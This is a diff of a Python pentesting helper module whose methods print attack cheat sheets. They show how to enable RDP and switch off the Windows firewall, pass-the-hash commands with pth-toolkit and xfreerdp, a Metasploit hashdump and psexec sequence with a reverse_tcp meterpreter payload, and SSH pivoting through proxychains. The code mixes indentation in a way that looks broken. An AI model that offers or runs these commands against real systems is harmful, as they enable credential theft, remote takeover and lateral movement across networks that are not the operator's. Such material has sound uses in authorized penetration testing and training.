@@ -3,30 +3,27 @@
 #Filename: Auxiliary.py
 #Description:
 
-descript = """
-Auxiliary module that provides procedures and tactics for pentesting
-"""
-
+descript = """ Auxiliary module that provides procedures and tactics for pentesting """
 
 import os
 import xmltodict
 from sets import Set
 
 def remove_dupes(jaja):
-        uniqueList = Set(jaja)
-        return uniqueList
+	uniqueList = Set(jaja)
+	return uniqueList
 
 
 def cp_collect():
-        master =[]
-        while 1:
-                host = raw_input("Item: ")
-                if host == "done":
-                        unique_master = remove_dupes(master)
-                        return unique_master
-                master.append(host)
-        unique_master = remove_dupes(master)
-        return unique_master
+	master =[]
+	while 1:
+			host = raw_input("Item: ")
+			if host == "done":
+					unique_master = remove_dupes(master)
+					return unique_master
+			master.append(host)
+	unique_master = remove_dupes(master)
+	return unique_master
 
 
 class auxilary:
@@ -34,7 +31,8 @@ class auxilary:
         pass
 
     def windows_useful_cmds(self):
-    """ Useful Win commands, postex, pwdump, procdump.exe, etc. """
+
+		""" Useful Win commands, postex, pwdump, procdump.exe, etc. """
 		text = r"""
 		net localgroup Users
 		net localgroup Administrators
@@ -52,53 +50,54 @@ class auxilary:
 
 
     def win_enable_rdp(self):
-	""" Enable Windows RDP, enable FW services """
-	text = """
-	reg add "hklm\system\currentcontrolset\control\\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
-	netsh firewall set service remoteadmin enable
-	netsh firewall set service remotedesktop enable
-	Turn off windows FW: netsh firewall set opmode disable
-	"""
-	print text
+
+		""" Enable Windows RDP, enable FW services """
+		text = """
+		reg add "hklm\system\currentcontrolset\control\\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+		netsh firewall set service remoteadmin enable
+		netsh firewall set service remotedesktop enable
+		Turn off windows FW: netsh firewall set opmode disable
+		"""
+		print text
 
 
     def pass_the_hash(self):
-	""" Pass the hash technique PTH and Meterpreter """
-	text = """
-	git clone https://github.com/byt3bl33d3r/pth-toolkit
-	pth-winexe -U hash //IP cmd
-	
-	or
 
-	apt-get install freerdp-x11
-	xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
+		text = """
+		git clone https://github.com/byt3bl33d3r/pth-toolkit
+		pth-winexe -U hash //IP cmd
+		
+		or
 
-	or
+		apt-get install freerdp-x11
+		xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
 
-	meterpreter > run post/windows/gather/hashdump
-	Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
-	msf > use exploit/windows/smb/psexec
-	msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
-	msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
-	msf exploit(psexec) > exploit
-	meterpreter > shell
-	"""
-	print text
+		or
+
+		meterpreter > run post/windows/gather/hashdump
+		Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+		msf > use exploit/windows/smb/psexec
+		msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+		msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+		msf exploit(psexec) > exploit
+		meterpreter > shell
+		"""
+		print text
 
     def ssh_pivoting(self):
-	""" SSH Pivoting on linux using proxychains """
-	text = """
-	From One Network to Another
-	---------------------------
-	
-	ssh -D 127.0.0.1:1080 -p 22 user1@IP1
-	Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
-	proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
-	Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
-	proxychains commands target
 
-	"""
-	print text
+		text = """
+		From One Network to Another
+		---------------------------
+
+		ssh -D 127.0.0.1:1080 -p 22 user1@IP1
+		Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
+		proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
+		Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
+		proxychains commands target
+
+		"""
+		print text
 
 
     def metasploit_pivot(self):
